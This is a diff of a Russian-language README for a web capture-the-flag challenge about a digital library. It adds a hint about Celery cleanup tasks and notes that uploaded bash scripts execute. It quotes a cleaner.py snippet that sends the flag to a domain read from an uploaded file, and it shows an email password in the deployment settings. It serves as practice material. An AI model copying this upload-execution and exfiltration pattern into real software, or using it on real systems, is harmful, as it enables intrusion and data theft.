@@ -1,9 +1,13 @@
-
 # web | library | medium
 
 ## Информация
 
 > Я создал электронную бибилиотеку, пока она на стадии разработки, но я надеюсь что у меня максимально безопасный сервис и с кодом все хорошо, проверь его на всякий случай, пожалуйста =)
+
+
+## Подсказка
+
+Если я правильно помню, то админ хотел удалять(очищать) старые книги как автоматизированно, через таски, celery таски....
 
 ## Деплой
 
@@ -28,7 +32,7 @@ public/public.zip
 SERVER_PORT=8900
 EMAIL_HOST_USER=admin@mylibrary.ru
 EMAIL_HOST_PASSWORD=to!R>@gq~Q8y2?XVVGe:
-                                        
+                                  
 ```
 
 посмотрим кусок кода в celery таске cleaner.py - если загрузить bash скрипт, то он исполнится, чтобы было безопаснее, то в код явно уже встроены методы взятия флага и резолва на удаленный хост
@@ -53,12 +57,12 @@ def cleaner():
                     dom = lines[2].replace('\n','')
                     url = f"{dom}/{flag}"
                     requests.get(url, verify=False, timeout=1)
-            
-                
-            
+      
+          
+      
             book.delete()
             deleted_count += 1
-        
+  
         except FileNotFoundError:
             print(f"File for {book.title} not found.")
             book.delete()
